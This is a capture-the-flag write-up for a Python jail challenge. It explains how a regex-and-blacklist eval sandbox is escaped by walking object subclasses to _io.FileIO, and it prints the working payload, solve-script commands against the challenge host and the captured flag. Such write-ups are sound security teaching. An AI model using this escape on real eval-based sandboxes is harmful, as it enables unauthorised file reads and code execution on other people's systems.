# Wait a minute - Writeup

Writeup for GreyCTF Quals 2026 `Wait a minute` (misc / pyjail).

## Challenge Files

- `server.py`
- `run.sh`
- `Dockerfile`
- `flag.txt`

## Overview

At first glance this looks like a standard "safe eval" challenge:

- a regex whitelist
- a length limit
- a blacklist of dangerous words
- `ast.parse(..., mode="eval")`
- `eval(..., {"__builtins__": {}}, {})`

The intended feeling is that builtins are gone and dangerous keywords are filtered, so arbitrary code execution should be blocked.

That is not enough.

## The Core Bug

Even when `__builtins__` is emptied, Python objects still expose a huge amount of runtime structure.

The important fact is:

```python
().__class__.__base__.__subclasses__()
```

This reaches `object.__subclasses__()` without using any blacklisted words like:

- `import`
- `open`
- `globals`
- `getattr`

From there we can discover I/O-related classes that are already loaded in memory, including `_io.FileIO`.

Once we get `_io.FileIO`, we can open and read `flag.txt` directly.

## Why The Filters Fail

### 1. The regex is only a character filter

The regex allows:

- letters
- digits
- dots
- underscores
- brackets
- parentheses
- quotes

That is already enough to build rich object-graph traversals.

### 2. The blacklist is substring-based

The blacklist blocks a few obvious dangerous words, but it does not block:

- `__class__`
- `__base__`
- `__subclasses__`

Those are the only tools we need.

### 3. `eval(..., {"__builtins__": {}})` is not a sandbox

Removing direct builtins only hides the front door. Existing runtime objects still link back to powerful classes and modules.

## Building The Exploit

On Python 3.12 in the provided environment, the path to `_io.FileIO` is:

```python
().__class__.__base__.__subclasses__()[129].__subclasses__()[2].__subclasses__()[0]
```

Breaking that down:

1. `()` creates an empty tuple
2. `().__class__` gives `<class 'tuple'>`
3. `().__class__.__base__` gives `<class 'object'>`
4. `object.__subclasses__()[129]` gives `_io._IOBase`
5. `._IOBase.__subclasses__()[2]` gives `_io._RawIOBase`
6. `._RawIOBase.__subclasses__()[0]` gives `_io.FileIO`

Then we instantiate it on the flag path and read the bytes:

```python
().__class__.__base__.__subclasses__()[129].__subclasses__()[2].__subclasses__()[0]('flag.txt').read()
```

This payload:

- uses only allowed characters
- avoids every blacklisted word
- parses as a valid expression
- returns the flag contents

## Local Reproduction

From this directory:

```bash
python3 solve.py --mode local
```

Or, if you only want the payload:

```bash
python3 solve.py --mode payload
```

## Remote Exploitation

The solve script can also attack the live service:

```bash
python3 solve.py --mode remote --host challs.nusgreyhats.org --port 36267
```

## Output

The service returns the file contents as a byte string:

```text
Result: b'grey{9eT_i7_h0w_Y0u_1iv3_1t_10_t0E5_iN_wH3n_We_5t4nDin_0n_Bu5Ine5S}'
```

## Notes

There is another interesting detail in the wrapper:

- `run.sh` prints `logs/err.log` on certain internal failures
- `Dockerfile` copies `flag.txt` into that log path

So there is also a wrapper-side flag leak angle. But the object-graph escape above is already a direct, clean solve against the Python jail itself.

## Flag

```text
grey{9eT_i7_h0w_Y0u_1iv3_1t_10_t0E5_iN_wH3n_We_5t4nDin_0n_Bu5Ine5S}
```
